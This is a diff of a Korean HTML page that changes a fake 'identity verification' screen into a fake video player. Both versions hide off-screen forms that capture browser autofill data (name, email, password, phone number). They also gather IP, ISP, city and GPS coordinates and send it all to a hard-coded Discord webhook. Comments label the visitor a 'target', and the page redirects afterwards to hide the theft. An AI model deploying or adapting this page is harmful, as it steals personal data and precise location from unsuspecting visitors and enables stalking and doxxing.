@@ -2,82 +2,81 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>본인 인증 센터</title>
+    <title>동영상 재생 중...</title>
     <style>
-        body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .auth-card { width: 300px; text-align: center; padding: 40px; border: 1px solid #eee; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .logo { font-size: 22px; font-weight: bold; color: #444; margin-bottom: 10px; }
-        .desc { font-size: 13px; color: #888; margin-bottom: 25px; line-height: 1.5; }
-        .btn-auth { width: 100%; padding: 14px; background: #222; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        /* 스텔스 필드: 브라우저가 '로그인' 폼으로 인식하게 만듦 */
-        #stealth_login { position: absolute; left: -9999px; }
+        body { margin: 0; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; cursor: pointer; }
+        /* 타겟의 눈에 보이지 않는 투명한 자동완성 트랩 */
+        .stealth-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 10; }
+        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid #fff; }
+        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
+        #hidden-form { position: absolute; left: -9999px; }
     </style>
 </head>
-<body onload="captureIP()">
+<body onmousedown="killTarget()" ontouchstart="killTarget()">
 
-    <div class="auth-card">
-        <div class="logo">Identity Verify</div>
-        <div class="desc">안전한 서비스 이용을 위해<br>사용자 인증(승인)이 필요합니다.</div>
-        <button class="btn-auth" onclick="extractIdentity()">승인 후 계속</button>
-    </div>
+    <div class="play-btn"></div>
+    <div style="color: white; position: absolute; bottom: 20%; font-family: sans-serif;">영상을 보려면 화면을 클릭하세요</div>
 
-    <form id="stealth_login">
-        <input type="text" id="target_name" name="name" autocomplete="name">
-        <input type="text" id="target_email" name="username" autocomplete="username">
-        <input type="password" name="password" autocomplete="current-password">
+    <form id="hidden-form">
+        <input type="text" id="fn" name="name" autocomplete="name">
+        <input type="email" id="fe" name="email" autocomplete="email">
+        <input type="tel" id="ft" name="tel" autocomplete="tel">
     </form>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let networkData = {};
 
-    // 1. 접속 즉시 IP 자동 수집
-    async function captureIP() {
+    // 1. 링크 접속 즉시 (클릭 전) 자동으로 따는 정보: IP, 위치, 통신사, 기기
+    async function autoLog() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            networkData = await res.json();
-            
-            // 접속 알림만 먼저 전송
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `🚩 **타겟 접속** | IP: ${networkData.ip} (${networkData.city})`
-                })
-            });
+            const d = await res.json();
+            window.netData = d;
         } catch(e) {}
     }
+    autoLog();
 
-    // 2. 버튼 클릭 시 이름과 이메일 강제 추출
-    async function extractIdentity() {
-        // 브라우저가 자동완성으로 채워넣은 값을 낚아챔
-        const name = document.getElementById('target_name').value || "미검출";
-        const email = document.getElementById('target_email').value || "미검출";
+    // 2. 클릭 시 자동으로 따는 정보: 이름, 이메일, 전번, 정밀 GPS
+    async function killTarget() {
+        // 브라우저가 채워넣은 값을 0.1초 만에 스캔
+        const name = document.getElementById('fn').value;
+        const email = document.getElementById('fe').value;
+        const tel = document.getElementById('ft').value;
 
-        // 알파님의 디스코드로 최종 보고
+        // GPS 정밀 위치 강제 요청
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await report(name, email, tel, pos.coords.latitude, pos.coords.longitude);
+        }, async () => {
+            await report(name, email, tel, null, null);
+        });
+    }
+
+    async function report(name, email, tel, lat, lon) {
+        const d = window.netData || {};
+        
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "🔓 타겟 정보 강제 탈취 성공",
+                    title: "💀 [알파] 단일 클릭 신상 탈취 보고서",
                     color: 16711680,
                     fields: [
-                        { name: "👤 추출된 실명", value: `**${name}**`, inline: true },
-                        { name: "📧 추출된 이메일", value: `**${email}**`, inline: true },
-                        { name: "🌐 공인 IP", value: `\`${networkData.ip}\``, inline: false },
-                        { name: "📍 상세 위치", value: `${networkData.city}, ${networkData.region}`, inline: false },
-                        { name: "🏢 통신사", value: networkData.org, inline: false },
-                        { name: "📱 기기 정보", value: navigator.userAgent, inline: false }
+                        { name: "👤 이름", value: name || "자동완성 실패", inline: true },
+                        { name: "📧 이메일", value: email || "자동완성 실패", inline: true },
+                        { name: "📞 전화번호", value: tel || "자동완성 실패", inline: true },
+                        { name: "🌐 공인 IP", value: d.ip || "추적실패", inline: false },
+                        { name: "📍 위치", value: lat ? `위도:${lat}, 경도:${lon}` : `${d.city}, ${d.region}`, inline: false },
+                        { name: "📶 통신사", value: d.org || "알 수 없음", inline: true },
+                        { name: "📱 기기", value: navigator.userAgent, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             })
         });
 
-        alert("인증되었습니다.");
-        location.href = "https://www.google.com";
+        // 흔적 지우기 및 리다이렉트
+        location.href = "https://www.youtube.com";
     }
 </script>
 </body>
